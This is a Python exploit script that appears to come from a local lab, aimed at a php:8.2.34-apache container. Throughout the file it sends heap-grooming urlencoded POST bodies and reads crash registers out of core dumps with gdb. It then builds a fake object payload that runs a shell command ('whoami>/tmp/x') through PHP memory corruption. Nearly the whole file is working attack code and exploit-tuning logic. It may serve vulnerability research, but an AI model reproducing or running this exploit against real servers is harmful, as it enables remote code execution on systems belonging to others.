#!/usr/bin/env python3
"""oom141: Datadog-style deterministic groom, ported to php:8.2.34-apache @8083.

Body (application/x-www-form-urlencoded), THREE fields:
  =<pct(V295)>&a=1&ZZZ...[x]=1
V295 payload layout (offsets inside the 295B value):
  [40:48] ptr  -> becomes unfinished bucket1 zval value (SIG8 / B)
  [48:52] type_info = 0x0106 (IS_STRING | refcounted)
  [56:64] h = 0 ; [64:72] key = 0
  [k..]   fake object block (oom116 constants), k in {80,96,112}
Mechanics: empty-name value (295+1+24=320B bin) freed -> a=1 forces arData
alloc (320B) -> tcache hit -> payload bytes = bucket storage -> huge name
key alloc fails after nNumUsed++ -> bucket1 stale = our bytes -> shutdown
walk: rdi = bucket1 val.value.
Measure: crash rdi must == SIG8 EXACTLY -> core -> str_val = sig_vaddr - 40.
Arm: B = str_val + k, bits ((B>>8)&1==1,(B>>9)&1==0); GS=B+0x90; same N.
Win: test -f /tmp/x after every fire (WIN-CHECK LAW).
"""
import struct, subprocess, time, urllib.request, urllib.error, re

HOST = "http://127.0.0.1:8083"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
VLEN = 288                          # default; main() sweeps VLENS (bin calibration)
VLENS = [295, 288, 279, 271, 263]   # 295 first: capture proven in core.141
NS = [3500000]                      # DV fatal proven at N>=3.35M (15/15), N+32 signature
BAD = (0x25, 0x26, 0x2b)            # '%', '&', '+' forbidden in raw wire value
KS = [112, 128, 144, 160]           # must be >=104 (key slot v[96:104]) and fit VLEN
CORE = "/tmp/core.141"
BASE = 0

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def x_state():
    return sh("test -f /tmp/x && echo X_EXISTS:$(cat /tmp/x) || echo NO_X").strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def fatal_lines():
    r = subprocess.run(["docker", "logs", "--tail", "40", "php_vuln"], capture_output=True, timeout=120)
    out = (r.stdout + r.stderr).decode("latin1", "replace")
    return [l for l in out.splitlines() if "memory size" in l or "Fatal error" in l][-2:]

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8083:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

def post_url(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def fire(body, N, tries):
    """oom134 fire() verbatim: fresh-core rm, segv delta, patient 10x2s poll."""
    for t in range(tries):
        sh("rm -f /tmp/core")
        n0 = segv_count()
        c, r = post_url(body)
        crashed = False
        for _ in range(10):
            time.sleep(2)
            if segv_count() > n0 or sh("test -f /tmp/core && echo y") == "y":
                crashed = True
                break
        print("try%d: http=%s segv+%d core=%s"
              % (t, c, segv_count() - n0,
                 sh("test -f /tmp/core && echo y") == "y"), flush=True)
        print("  body[:180]: %r" % r[:180], flush=True)
        m = re.search(r"tried to allocate (\d+)", r)
        if m:
            a = int(m.group(1))
            print("  alloc=%d delta_vs_N=%+d %s" % (a, a - N,
                  "<-- KEY-ALLOC FATAL (DV point)" if 0 <= a - N <= 128 else "(reader/other)"), flush=True)
        if not crashed and c == 200:
            fl = fatal_lines()
            if fl:
                print("  fatal:", fl[-1][-110:], flush=True)
        if crashed:
            return True
    return False

def build_value(ptr8, arm=None):
    """Unfinished bucket1 lives at chunk+64 (hash slots 0..32, bucket0 32..64).
    ZVAL_COPY_VALUE never runs (key alloc fails first) -> stale value bytes
    ARE bucket1's zval: value@+64, type_info@+72. h@+80/key@+88 clobbered by
    DV writes -- don't care."""
    v = bytearray(b"\xde" * VLEN)
    # Core-decoded (oom141f): bucket1.val @ v+72, type @ v+80, h @ v+88, key @ v+96
    v[72:80] = ptr8
    struct.pack_into("<I", v, 80, 0x0106 if not arm else 0x108)
    struct.pack_into("<QQ", v, 88, 0, 0)   # h=0, key=NULL (key release skipped)
    if arm:
        B, k = arm
        st = struct.pack_into
        st("<II", v, k + 0x00, 1, 0x108)
        st("<II", v, k + 0x08, 1, 0)
        st("<Q", v, k + 0x10, 0)
        st("<Q", v, k + 0x18, B + 0x68)
        st("<I", v, k + 0x2C, 1)
        st("<Q", v, k + 0x50, B + 0x90)
        v[k + 0x58] = 6
        st("<I", v, k + 0x5C, 0x106)
        st("<Q", v, k + 0x68, 0)
        st("<Q", v, k + 0x70, BASE + ZIF)
        st("<IIQQ", v, k + 0x90, 1, 0x106, 0, len(CMD))
        v[k + 0xA8: k + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
    return bytes(v)

def build_body(ptr8, N, arm=None, vlen=None):
    """RAW wire value (estrndup allocates WIRE length = the groom chunk size).
    Only constraint: value bytes must avoid %, &, + (no escaping -> length
    preserved). '=' and 0x00 inside the value are harmless."""
    v = build_value(ptr8, arm)
    if vlen is not None:
        v = (v + b"\xde" * vlen)[:vlen]
    assert not any(b in BAD for b in v), "bad wire byte in value"
    return b"=" + v + b"&a=1&" + b"Z" * N + b"[x]=1"

def pull_core():
    subprocess.run(["docker", "cp", "php_vuln:/tmp/core", "/tmp/core.tmp"], capture_output=True)
    subprocess.run(["docker", "cp", "/tmp/core.tmp", "phpbuild:" + CORE], capture_output=True)
    m = subprocess.run(["docker", "exec", "phpbuild", "md5sum", CORE], capture_output=True)
    print("core ->", CORE, m.stdout.decode().strip()[:44], flush=True)
    return CORE

def core_rdi(core):
    subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                    'printf "set pagination off\\nset confirm off\\ninfo registers rdi\\nquit\\n" > /tmp/g141.gdb'],
                   capture_output=True)
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g141.gdb /tmp/libphp.stock.so %s 2>&1 | grep -E '^rdi'" % core],
                       capture_output=True, timeout=240)
    m = re.search(r"rdi\s+0x([0-9a-f]+)", r.stdout.decode("latin1"))
    return int(m.group(1), 16) if m else None

def sig_vaddrs(core):
    r = subprocess.run(["docker", "exec", "phpbuild", "python3", "-c", """
import struct, sys
f = open(sys.argv[1], 'rb').read()
sig = bytes.fromhex('5151e2c0de51e2c0'.replace('51','51'))
sig = struct.pack('<Q', 0x51E2C0DE51E2C0DE)
e_phoff = struct.unpack_from('<Q', f, 0x20)[0]
e_phentsize, e_phnum = struct.unpack_from('<HH', f, 0x36)
segs = []
for k in range(e_phnum):
    off = e_phoff + k * e_phentsize
    p = struct.unpack_from('<IIQQQQQ', f, off)
    if p[0] == 1 and p[5] >= 0x100000:
        segs.append((p[3], p[2], p[5]))
hits = []
i = f.find(sig)
while i != -1:
    for base, off, sz in segs:
        if off <= i < off + sz:
            hits.append(base + (i - off))
    i = f.find(sig, i + 1)
print('SIGS=' + ','.join('0x%x' % h for h in hits))
""", core], capture_output=True, timeout=180)
    m = re.search(r"SIGS=([\dxaf,]*)", r.stdout.decode())
    if not m or not m.group(1):
        return []
    return [int(x, 16) for x in m.group(1).split(",") if x]

def main():
    global BASE
    print("=== oom141: datadog 3-field groom ===", flush=True)
    c, o = get(HOST + "/oom_sapi.php")
    print("sapi:", o.strip()[:60])
    assert sh("md5sum /usr/lib/apache2/modules/libphp.so").split()[0] == STOCK_MD5
    print("md5 ok")
    assert recreate(), "recreate failed"
    c, o = get(HOST + "/oom_sapi.php")
    print("sapi after recreate:", o.strip()[:60])
    assert "lim=16777216" in o, "memory_limit did not apply"
    BASE = base_now()
    print("base=0x%x" % BASE, flush=True)

    # ---- measure: sweep VLEN (bin calibration) at fixed DV-fatal N ----
    rdi = None
    winN = NS[0]
    winV = None
    for V in VLENS:
        print("--- VLEN=%d N=%d ---" % (V, winN), flush=True)
        if fire(build_body(SIG8, winN, vlen=V), winN, tries=2):
            core = pull_core()
            rdi = core_rdi(core)
            print("measure rdi=0x%x want=0x%x" % (rdi if rdi else 0,
                  struct.unpack("<Q", SIG8)[0]), flush=True)
            if rdi == struct.unpack("<Q", SIG8)[0]:
                winV = V
                break
        if x_state().startswith("X_EXISTS"):
            print("*** WON in measure?! ***", x_state()); return
    if winV is None:
        print("BUCKET CONTROL NOT CONFIRMED (rdi != SIG8 for all VLEN)")
        print("final x:", x_state()); print("=== done ==="); return

    # ---- locate the chunk: SIG8 lands at bucket1.val = v+72 -> v = sig - 72 ----
    sigs = sig_vaddrs(CORE)
    print("sig vaddrs:", ["0x%x" % s for s in sigs])
    str_vals = [s - 72 for s in sigs if s % 16 == 0]
    print("str_val candidates:", ["0x%x" % v for v in str_vals])
    if not str_vals:
        print("no aligned str_val -> abort"); print("final x:", x_state()); print("=== done ==="); return

    # ---- arm: B = str_val + k, block in same payload ----
    for str_val in str_vals[:2]:
        for k in KS:
            B = str_val + k
            if not ((B >> 56) == 0 and ((B >> 8) & 1) == 1 and ((B >> 9) & 1) == 0):
                continue
            if k + 0xA8 + len(CMD) + 1 > winV:
                continue  # block+GS+cmd must fit inside the VLEN payload
            print("--- ARM B=0x%x k=%d N=%d VLEN=%d ---" % (B, k, winN, winV), flush=True)
            body = build_body(struct.pack("<Q", B), winN, arm=(B, k), vlen=winV)
            if fire(body, winN, tries=2):
                r = core_rdi(CORE)
                print("arm crash rdi=0x%x want=0x%x %s" % (r if r else 0, B,
                      "MATCH" if r == B else "MISS"), flush=True)
            for _ in range(3):
                xs = x_state()
                if xs.startswith("X_EXISTS"):
                    print("*** WON *** %s" % xs); return
                time.sleep(3)
    print("final x:", x_state())
    print("=== done ===", flush=True)

if __name__ == "__main__":
    main()
